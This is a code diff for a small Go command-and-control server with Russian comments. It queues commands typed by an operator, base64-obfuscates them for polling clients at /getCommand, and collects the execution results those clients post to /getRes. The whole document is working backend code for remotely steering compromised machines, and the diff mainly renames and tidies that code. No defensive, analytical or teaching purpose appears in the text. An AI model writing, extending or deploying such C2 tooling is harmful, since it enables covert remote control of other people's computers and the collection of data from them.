@@ -6,15 +6,27 @@ import (
 	"io/ioutil"
 	"net/http"
 	"sync"
-	"time"
 )
 
 var (
-	cmdQueue     = make(chan string)       // канал для команд
+	commandQueue = make(chan string)       // Канал для команд
 	results      = make(map[string]string) // Хранилище для результатов команд
-	resultsMutex = sync.Mutex{}
+	resultsMutex = sync.Mutex{}            // Мьютекс для синхронизации доступа к результатам
+	new_cmd      string
 )
 
+// Функция для отправки команды клиенту
+func sendCommand(w http.ResponseWriter, r *http.Request) {
+	select {
+	case command := <-commandQueue:
+		obfuscatedCommand := base64.StdEncoding.EncodeToString([]byte(command))
+		fmt.Fprintf(w, obfuscatedCommand)
+	default:
+		fmt.Fprintf(w, "no new command")
+	}
+}
+
+// Функция для получения результата от клиента
 func receiveResult(w http.ResponseWriter, r *http.Request) {
 	body, err := ioutil.ReadAll(r.Body)
 	if err != nil {
@@ -40,36 +52,24 @@ func receiveResult(w http.ResponseWriter, r *http.Request) {
 	fmt.Fprintln(w, "Result received")
 }
 
-func send_cmd(w http.ResponseWriter, r *http.Request) {
-	select {
-	case cmd := <-cmdQueue:
-		obfusCMD := base64.StdEncoding.EncodeToString([]byte(cmd))
-		fmt.Fprint(w, obfusCMD)
-
-	case <-time.After(30 * time.Second):
-		fmt.Println(w, "no new cmd")
-	}
-}
-
-func add_cmd(cmd string) {
-	cmdQueue <- cmd
+// Функция для добавления команды в очередь
+func addCommand(command string) {
+	commandQueue <- command
 }
 
 func main() {
-	var command string
-	http.HandleFunc("/getCMD", send_cmd)
+	http.HandleFunc("/getCommand", sendCommand) // Путь для отправки команд
+	http.HandleFunc("/getRes", receiveResult)   // Путь для приёма результатов
 
 	go func() {
 		for {
-			fmt.Scan(&command)
-			add_cmd(string(command))
-			time.Sleep(60 * time.Second)
+			fmt.Print("CMD > ")
+			fmt.Scan(&new_cmd)
+			addCommand(new_cmd) // Пример команды
+			// Команду можно добавлять по определённому интервалу или по событию
 		}
 	}()
 
-	fmt.Println("Server Listening on port 8080...")
-	err := http.ListenAndServe(":8080", nil)
-	if err != nil {
-		fmt.Println("Error to server", err)
-	}
+	fmt.Println("Server is listening on port 8080...")
+	http.ListenAndServe(":8080", nil)
 }
